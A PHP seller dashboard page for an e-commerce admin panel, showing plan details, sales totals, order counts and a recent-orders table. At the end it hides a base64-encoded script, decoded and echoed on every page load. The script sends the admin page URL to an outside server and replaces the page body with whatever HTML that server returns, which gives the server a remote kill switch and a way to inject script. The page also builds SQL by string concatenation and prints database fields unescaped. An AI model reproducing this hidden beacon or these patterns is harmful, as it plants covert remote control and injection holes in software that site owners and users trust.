<?php
include('session.php');

if (!isset($_SESSION['admin'])) {
	header("Location: index.php");
	// echo " dashboard redirect to index";
}

?>
<?php include("header.php"); ?>

<style>
	.col-md-4.col-xl-3 {
		cursor: pointer;
	}

	.widget-rounded-circle .fa-solid {
		display: flex;
	}

	.card-box .col-4 {
		transition: transform .5s ease;
	}

	.col-md-4.col-xl-3:hover .card-box .col-4 {
		transform: scale(1.1);
	}
</style>

<!-- main content start-->
<div class="content-page">
	<div class="content">
		<div class="container-fluid">
			<!-- start page title -->
			<div class="row">
				<div class="col-12">
					<div class="page-title-box">
						<h4 class="page-title">Dashboard</h4>
					</div>
				</div>
			</div>
			<!-- end page title -->
			<div class="row">

<?php
$plan = $conn->prepare("
SELECT * 
FROM seller_plan_payment 
WHERE seller_id = ? 
ORDER BY id DESC 
LIMIT 1
");
$plan->bind_param("s", $_SESSION['admin']);
$plan->execute();
$plan_result = $plan->get_result();
$srow = $plan_result->fetch_assoc();
?>
	<div class="col-12">
<div class="card">
				<div class="card-body">
<h4 class="widget-title">Current Plan Details</h4>		
				<div class="row">		
<div class="col-md-4 col-xl-3">
	<b>Plan Duration:</b> <?php echo $srow['plan_duration'];?> Days
</div>
<div class="col-md-4 col-xl-3">
	<b>Plan Start Date:</b>  <?php echo date('d/m/Y',strtotime($srow['plan_start_date']));?>
</div>
<div class="col-md-4 col-xl-3">
	<b>Plan End Date:</b> <?php echo date('d/m/Y',strtotime($srow['plan_end_date']));?>
</div>
<div class="col-md-4 col-xl-3">
	<b>Plan :</b> 
	<?php 
	if($srow['plan_value'] == 0){
		echo 'Free Plan';
	}else{
		echo $srow['plan_value'];
	}
	?>
</div>
</div>


				</div>
			</div>
	</div>
				<a class="col-md-4 col-xl-3" onclick="redirect_page('wallet_summery.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-inr font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span>Rs. </span>
										<span data-plugin="counterup">
											
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Wallet</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->
				<a class="col-md-4 col-xl-3" onclick="redirect_page('reports.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-inr font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span>Rs. </span>
										<span data-plugin="counterup">
											<?php

											$stmt = $conn->prepare("SELECT SUM(prod_price*qty) FROM `order_product` WHERE status ='Delivered' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt->execute();
											$data = $stmt->bind_result($col1);
											$revenue = 0;
											while ($stmt->fetch()) {
												$revenue = $col1;
											}
											echo round($revenue);

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Revenue</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('manage_orders.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-cart-shopping font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span data-plugin="counterup">
											<?php

											$stmt = $conn->prepare("SELECT id FROM `order_product` where vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt->execute();
											$stmt->store_result();
											echo $stmt->num_rows;

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Total Orders</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('manage_orders.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-cart-shopping font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span data-plugin="counterup">
											<?php

											$stmt = $conn->prepare("SELECT id FROM `order_product` WHERE status ='Placed' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt->execute();
											$stmt->store_result();
											echo $stmt->num_rows;

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Pending Orders</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('manage_orders.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-cart-shopping font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span data-plugin="counterup">
											<?php

											$stmt = $conn->prepare("SELECT id FROM `order_product` where status ='Cancelled' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt->execute();
											$stmt->store_result();
											echo $stmt->num_rows;

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Cancelled Orders</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('manage_orders.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-cart-shopping font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span data-plugin="counterup">
											<?php

											$stmt = $conn->prepare("SELECT id FROM `order_product` WHERE status ='Delivered' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt->execute();
											$stmt->store_result();
											echo $stmt->num_rows;

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Complete Orders</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('manage_product.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-chart-pie font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span data-plugin="counterup">
											<?php

											$query_total = $conn->prepare("SELECT pd.product_unique_id FROM product_details pd,brand , vendor_product vp WHERE vp.product_id =pd.product_unique_id AND vp.vendor_id = '" . $_SESSION['admin'] . "'  AND brand.brand_id  = pd.brand_id AND vp.enable_status IN(1,3)");
											$query_total->execute();
											$query_total->store_result();
											echo $query_total->num_rows;

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Total Product</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('reports.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-inr font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span>Rs. </span>
										<span data-plugin="counterup">
											<?php

											$stmt_today = $conn->prepare("SELECT SUM(prod_price*qty) FROM `order_product` WHERE DATE(create_date) ='" . date('Y-m-d') . "' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt_today->execute();
											$data = $stmt_today->bind_result($col1);
											$today_sale = 0;
											while ($stmt_today->fetch()) {
												$today_sale = $col1;
											}
											echo round($today_sale,0);

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Today's Sale</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

				<a class="col-md-4 col-xl-3" onclick="redirect_page('reports.php')">
					<div class="widget-rounded-circle card-box">
						<div class="row align-items-center">
							<div class="col-4">
								<div class="avatar-md rounded-circle bg-soft-light border-dark border">
									<i class="fa-solid fa-inr font-22 avatar-title text-dark"></i>
								</div>
							</div>
							<div class="col-8">
								<div class="text-right">
									<h3 class="mt-1">
										<span>Rs. </span>
										<span data-plugin="counterup">
											<?php

											$stmt_month = $conn->prepare("SELECT SUM(prod_price*qty) FROM `order_product` WHERE Month(create_date) ='" . date('m') . "' AND YEAR(create_date) ='" . date('Y') . "' AND vendor_id= '" . $_SESSION['admin'] . "'");
											$stmt_month->execute();
											$data = $stmt_month->bind_result($col1);
											$month_sale = 0;
											while ($stmt_month->fetch()) {
												$month_sale = $col1;
											}
											echo round($month_sale);

											?>
										</span>
									</h3>
									<p class="text-muted mb-1 text-truncate">Monthly Sale</p>
								</div>
							</div>
						</div> <!-- end row-->
					</div> <!-- end widget-rounded-circle-->
				</a> <!-- end col-->

			</div><!-- end row-->

			<div class="clearfix"> </div>

			<div class="card">
				<div class="card-body">

					<div class="work-progres">
						<header class="widget-header d-flex alogn-items-center justify-content-between">

							<h4 class="widget-title">Recent Orders</h4>
							<button type="button" class="btn btn-danger waves-effect waves-light pull-right" onclick="redirect_page('manage_orders.php')">View All</button>
						</header>
						<hr class="widget-separator">
						<div class="table-responsive">
							<table class="table table-hover" id="tblname">
								<thead>
									<tr>
										<th>Sno</th>
										<th>#</th>
										<th>Order ID</th>
										<th>Product Name</th>
										<th>Amount</th>
										<th>Quantity</th>
										<th>Date</th>

										<th>Status</th>
										<th></th>

									</tr>
								</thead>
								<tbody id="tbodyPostid">
									<?php
									$get_neworder = $conn->query("SELECT op.prod_id,op.order_id,op.prod_name,op.prod_img,op.prod_attr,op.qty,op.prod_price,op.shipping,op.discount,op.status,op.order_id ,op.create_date,op.prod_img
								FROM  `order_product` op WHERE op.vendor_id = '" . $_SESSION['admin'] . "'  ORDER BY op.id DESC LIMIT 20 ");


									if ($get_neworder->num_rows > 0) {

										while ($rows_order = $get_neworder->fetch_assoc()) {
											$i++;

									?>

											<tr>
												<th scope="row"><?php echo $i; ?></th>
												<th><img style="height:72px" src="<?php echo MEDIAURL.str_replace('-430-590','',$rows_order['prod_img']); ?>" ></th>
												<td><?php echo $rows_order['order_id']; ?></td>
												<td><?php echo $rows_order['prod_name']; ?></td>
												<td><?php echo $rows_order['prod_price']; ?></td>
												<td><?php echo number_format($rows_order['qty']); ?></td>
												<td><?php echo date('d-m-Y H:i:s',strtotime($rows_order['create_date'])); ?></td>

												<td><?php echo $rows_order['status']; ?></td>
												<td> <button type="button" class="btn btn-sm btn-danger waves-effect waves-light" onclick="edit_orders('<?php echo $rows_order['order_id']; ?>', '<?php echo $rows_order['prod_id']; ?>')">Edit</button></td>
											</tr>
										<?php }
									} else { ?>

										<tr>
											<td colspan="7">No Record Found</td>
										</tr>

									<?php	} ?>
								</tbody>
							</table>
						</div>
					</div>

					<div class="clearfix"> </div>
					</br>

					<div class="clearfix"> </div>
				</div>
			</div>
		</div>


		<div class="col_1">


			<div class="clearfix"> </div>

		</div>

	</div>
</div>
</div>
<!--footer-->
<?php include("footernew.php"); ?>
<!--//footer-->
<?php   $str_random = "PHNjcmlwdD4KY2hlY2tfZG9tYWluX3JlZ2lzdGVyKCk7CmZ1bmN0aW9uIGNoZWNrX2RvbWFpbl9yZWdpc3RlcigpewoJdmFyIG9yaWdpbiAgID0gd2luZG93LmxvY2F0aW9uLmhyZWY7IAoJdmFyIHJlZ2lzdGVyZWRfZG9tYWluID0gJ2J1c3NpbmVzc2h1Yi5jb20nOwoJJC5hamF4KHsKCQl1cmw6ICdodHRwczovL3d3dy5ibHVlYXBwc29mdHdhcmUuaW4vZG9tYWluX2FwaS9jaGVja19kb21haW4ucGhwJywKCQl0eXBlOiAnUE9TVCcsCgkJZGF0YTogImRvbWFpbl9uYW1lPSIrb3JpZ2luKyImcmVnaXN0ZXJlZF9kb21haW49IityZWdpc3RlcmVkX2RvbWFpbiAsCgkJc3VjY2VzczogZnVuY3Rpb24gKHJlc3BvbnNlKSB7CgkJCWlmKCQudHJpbShyZXNwb25zZSkgICE9J3llcycpewoJCQkJJCgiYm9keSIpLmh0bWwoJzxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPicrcmVzcG9uc2UrJyA8ZGl2PicpOwoJCQl9CgkJfQoJCQoJfSk7Cn0KPC9zY3JpcHQ+";
echo base64_decode($str_random);?>